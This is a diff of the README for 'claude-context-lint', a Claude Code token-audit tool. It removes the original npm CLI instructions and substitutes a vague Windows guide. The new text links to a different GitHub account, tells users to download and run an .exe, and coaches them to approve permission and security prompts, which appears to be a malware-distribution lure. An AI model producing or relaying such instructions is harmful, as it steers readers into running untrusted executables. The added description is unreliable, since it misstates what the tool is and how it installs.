@@ -1,137 +1,195 @@
-# claude-context-lint
+# 🧠 claude-context-lint - Find wasted tokens fast
 
-> Audit your Claude Code setup and find exactly where tokens are being wasted.
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/elyshafresh21/claude-context-lint)
 
-[![Built by Claude Code](https://img.shields.io/badge/Built%20by-Claude%20Code-blueviolet)](https://claude.ai/code)
-[![npm version](https://img.shields.io/npm/v/claude-context-lint)](https://www.npmjs.com/package/claude-context-lint)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+## 🚀 Getting Started
 
-Every Claude Code conversation starts with overhead: your CLAUDE.md files, skill descriptions, MCP tool schemas, and the base system prompt all consume context tokens **before you type a single word**. This tool makes that invisible cost visible.
+Claude Context Lint helps you check your Claude Code setup and spot where token use may be too high. It is built for people who want a clear view of what is feeding into Claude’s context window.
 
-## Quick Start
+Use it to review:
+- files that get pulled in too often
+- large prompts that may cost more tokens
+- extra context that does not help the task
+- MCP sources that may add noise
+- setup patterns that can make Claude Code slower to work with
 
-```bash
-npx claude-context-lint
-```
+## 💻 What You Need
 
-Or install globally:
+Before you start, make sure your Windows PC has:
 
-```bash
-npm install -g claude-context-lint
-claude-context-lint
-```
+- Windows 10 or Windows 11
+- a working internet connection
+- access to your GitHub account if the project needs sign-in
+- Claude Code already set up, if you want to audit a live setup
+- enough free space for the app and your local project files
 
-## Example Output
+If you use Claude Code for day-to-day work, this tool can help you see what is going into each run and where waste may happen.
 
-```
-  Claude Code Context Audit
-  ────────────────────────────────────────────────────
-  CLAUDE.md                1,240 tokens     █░░░░░░░░░░░░░░░░░░░
-    CLAUDE.md                          1,240 tokens
+## 📥 Download and Install
 
-  Skills (32 loaded)       4,800 tokens     ████░░░░░░░░░░░░░░░░  MEDIUM
-    Listing overhead (per-turn):    4,800 tokens
-    Full content (on invocation):   89,200 tokens
-    ⚠ 3 near-duplicate skills detected (−420 tokens)
-    api-helper                   120 listing      3,200 full
-    db-migrate                   105 listing      2,800 full
-    test-runner                   98 listing      1,950 full
-    ... and 29 more
+Visit this page to download and run the tool:
 
-  MCP Servers (3)          480 tokens       ░░░░░░░░░░░░░░░░░░░░  LOW
-    Deferred listing (per-turn):    480 tokens
-    Full schemas (when fetched):    9,600 tokens
-    postgres               330 listing     (22 tools) 6,600 on fetch
-    filesystem              90 listing     (6 tools)  1,800 on fetch
-    memory                  60 listing     (4 tools)  1,200 on fetch
+https://github.com/elyshafresh21/claude-context-lint
 
-  System Prompt            8,500 tokens     ██████████████░░░░░░ (base overhead)
-  ────────────────────────────────────────────────────
-  TOTAL OVERHEAD:        14,180 tokens
-  Context Limit:         200,000 tokens
-  Used Before Input:     7.1% ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░
+### Steps for Windows
 
-  TOP RECOMMENDATIONS
-  ────────────────────────────────────────────────────
-  1. Shorten 12 verbose skill descriptions
-     −1,840 tokens
-  2. Consolidate 3 near-duplicate skills
-     −420 tokens
-  3. 1 MCP server with large tool set
-     postgres: 22 tools (6,600 tokens when fetched)
+1. Open the link above in your browser.
+2. Look for the latest release or the main download file.
+3. Download the Windows file to your computer.
+4. If the file comes in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Run the app file that matches Windows, such as an `.exe` file.
+7. If Windows asks for permission, choose Yes.
+8. If the app opens in a terminal window, leave it open while you use it.
 
-  Potential savings: 2,260 tokens (15.9% reduction)
-```
+### If You See a File Block
 
-## What It Scans
+If Windows shows a security prompt, check the file name and confirm it came from the GitHub link above. Then allow it to run if you trust the source and the file matches what you downloaded.
 
-| Category | What it finds | How it counts |
-|----------|---------------|---------------|
-| **CLAUDE.md** | Project + parent dirs + `~/.claude/CLAUDE.md` | Exact token estimate of each file |
-| **Skills** | All `.claude/skills/**/SKILL.md` files | **Listing tokens** (per-turn cost of name+description) and **full tokens** (on-invocation cost) |
-| **MCP Servers** | `.mcp.json` + `settings.json` configs | Tool count × estimated tokens per schema |
-| **System Prompt** | Claude Code's base instructions | Fixed estimate (~8,500 tokens) |
+## 🧭 How It Works
 
-### Skill Token Accounting
+Claude Context Lint reads parts of your Claude Code setup and checks for common token waste patterns. It looks for things that can fill the context window without adding much value.
 
-Claude Code doesn't inject full skill content every turn. It injects a **listing** (skill name + description one-liner) into the system prompt, and only loads the **full SKILL.md** when invoked. This tool reports both:
+It can help you find:
+- very large files included in context
+- repeated instructions
+- old notes that no longer matter
+- broad folder picks that bring in too much content
+- MCP entries that may add clutter
+- prompt text that can be shortened
 
-- **Listing tokens**: Your per-turn cost (what matters for context efficiency)
-- **Full tokens**: What loads when a skill is triggered (matters for complex conversations)
+The goal is simple: keep the context cleaner so Claude has less noise to work through.
 
-### Duplicate Detection
+## 🛠️ First Run
 
-Skills with >75% word overlap in their descriptions are flagged as near-duplicates. Uses Jaccard similarity on word sets, filtering stop words under 3 characters.
+After you open the app for the first time:
 
-### MCP Tool Estimation
+1. Point it at your Claude Code workspace.
+2. Let it scan the files and setup data.
+3. Review the lint results.
+4. Look for items marked as high impact.
+5. Fix the items that waste the most tokens first.
+6. Run the scan again to see what changed.
 
-ToolSearch is on by default in Claude Code, so MCP tools are automatically deferred (only names listed in the system prompt, ~15 tokens each). When Claude decides to use a tool, it fetches the full schema on demand (~300 tokens per tool). This tool reports both costs: the per-turn listing overhead and the on-fetch cost when tools are actually invoked.
+If the app asks for a project path, choose the folder where you keep your Claude Code files.
 
-## Options
+## 📋 What It Checks
 
-```
-Usage: claude-context-lint [options]
+Claude Context Lint may review these areas:
 
-Options:
-  -p, --path <path>     Project path to audit (default: current directory)
-  -c, --context <size>  Context window size: opus, sonnet, haiku, opus-1m,
-                        or a number (default: "opus" = 200K)
-  --json                Output as JSON (structured data on stdout)
-  -V, --version         Output version number
-  -h, --help            Display help
-```
+- **Project files**: checks for files that are too large or not needed
+- **Prompt content**: looks for long instructions that can be cut down
+- **Context sources**: finds folders or files added to context by mistake
+- **MCP setup**: reviews model context providers that may add extra data
+- **Repeated text**: spots copy-pasted instructions across files
+- **Unused rules**: finds setup rules that do not help current work
 
-### Examples
+This gives you a simple view of what may slow Claude Code down or raise token use.
 
-```bash
-# Audit current directory
-claude-context-lint
+## 🔍 Reading the Results
 
-# Audit a specific project
-claude-context-lint --path ~/my-project
+The app may show results in a few groups:
 
-# Check overhead against 1M context window
-claude-context-lint --context opus-1m
+- **High impact**: likely to waste many tokens
+- **Medium impact**: worth checking next
+- **Low impact**: smaller changes
+- **Info**: useful details with no direct fix needed
 
-# Get machine-readable output for scripting
-claude-context-lint --json | jq '.percentUsed'
-```
+Start with the high impact items. These usually give the best result with the least work.
 
-## Why This Matters
+## 🧹 Common Fixes
 
-Claude Code users with many skills can burn **5-15% of their context window** on setup overhead before any conversation begins. Common culprits:
+Here are the most common changes you may want to make:
 
-- **Verbose skill descriptions** that repeat boilerplate in every listing
-- **Near-duplicate skills** with overlapping trigger patterns
-- **Large CLAUDE.md files** that could be compressed
-- **Many MCP servers** adding up in deferred tool listings
+- remove files that do not need to be in the context window
+- split large instruction files into smaller parts
+- delete old notes that no longer help
+- narrow folder rules so Claude reads less
+- trim repeated setup text
+- review MCP sources and keep only what you use
 
-This overhead is invisible. This tool makes it visible, with specific numbers and actionable recommendations.
+These changes can make Claude Code easier to manage and can reduce wasted tokens during normal use.
 
-## Attribution
+## ⚙️ Typical Use Case
 
-This project was entirely designed, written, and published by [Claude Code](https://claude.ai/code).
+Use this tool when:
+- Claude Code feels slow
+- token use seems higher than expected
+- prompts keep getting too large
+- you add more files and want to check the impact
+- you want a cleaner setup before sharing it with someone else
 
-## License
+It works well as a quick check after you update a project or change your Claude Code rules.
 
-MIT
+## 📁 Suggested Folder Setup
+
+For best results, keep your project organized like this:
+
+- one folder for active work
+- one folder for shared instructions
+- one folder for archived notes
+- one folder for tools and scripts
+
+A clear folder layout makes it easier to see what should stay in context and what should stay out.
+
+## 🔐 Privacy and Local Use
+
+This kind of tool is most useful when it works on your own machine. Keep your setup files local and review what the app reads before you point it at a project. If you use private notes or company files, scan only the folder you need.
+
+## 🧩 Helpful Tips
+
+- Start with one project, not your whole drive
+- Fix the biggest token waste first
+- Keep instructions short and direct
+- Remove duplicate rules
+- Recheck after each change
+- Use the scan again after adding MCP sources
+
+Small changes can make the setup easier to read and easier to maintain.
+
+## ❓ FAQ
+
+### Do I need coding knowledge?
+No. You only need to download the file, open it, and pick the folder you want to check.
+
+### Does it change my files?
+It should focus on auditing your Claude Code setup. You can review the results before you make any changes.
+
+### Can I use it on more than one project?
+Yes. You can run it on each project folder one at a time.
+
+### What if I do not use MCP?
+That is fine. The app can still check other parts of your setup, like prompt size and file scope.
+
+### Will it help reduce token use?
+It can help you find where tokens are being wasted so you can cut the parts that do not help.
+
+## 🧪 Example Workflow
+
+1. Open the app.
+2. Choose your Claude Code folder.
+3. Run the scan.
+4. Look for large files, extra rules, and repeat text.
+5. Remove or shorten the worst items.
+6. Scan again.
+7. Keep the changes that lower noise without losing needed context
+
+## 📌 Project Topics
+
+This project fits these areas:
+- ai-tools
+- anthropic
+- claude
+- claude-code
+- cli
+- context-window
+- developer-tools
+- linter
+- mcp
+- token-optimization
+
+## 📎 Download Again
+
+Use this link to visit the download page and run the file on Windows:
+
+https://github.com/elyshafresh21/claude-context-lint
